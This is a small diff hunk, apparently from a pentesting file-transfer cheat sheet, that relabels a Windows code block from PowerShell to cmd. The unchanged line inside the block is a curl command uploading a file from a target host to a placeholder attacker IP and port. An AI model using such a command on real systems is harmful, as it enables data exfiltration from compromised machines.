@@ -61,7 +61,7 @@ Target host uploads files
 
 Windows
 
-```powershell
+```cmd
 curl --upload-file test.txt http://<attacker ip>:<attacker port>/
 ```
 
